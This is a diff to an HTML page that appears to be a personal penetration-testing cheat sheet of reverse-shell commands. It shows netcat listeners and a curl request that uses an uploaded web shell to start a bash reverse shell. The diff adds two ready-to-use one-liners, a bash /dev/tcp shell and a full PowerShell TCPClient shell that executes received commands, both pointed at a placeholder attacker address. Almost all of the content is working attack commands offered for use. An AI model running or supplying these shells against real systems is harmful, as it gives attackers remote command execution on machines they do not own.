@@ -55,11 +55,21 @@
               https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
           </div>
 
-          <div class="comment-line">---- Reverse Shell cmd  -----</div> 
+          <div class="comment-line">---- Reverse Shell cmd  -----</div>
           <div>
             nc -lvnp 443</br>
             rlwrap nc -lvnp 443</br>
             curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'"
+          </div>
+
+          <div class="comment-line">---- Reverse Shell one-liner (bash) -----</div>
+          <div>
+            bash -c 'bash -i >&amp; /dev/tcp/IPADRESS/4444 0>&amp;1'
+          </div>
+
+          <div class="comment-line">---- Reverse Shell one-liner (cmd / PowerShell) -----</div>
+          <div>
+            powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IPADRESS',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendback2byte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendback2byte,0,$sendback2byte.Length);$stream.Flush()};$client.Close()"
           </div>
 
 
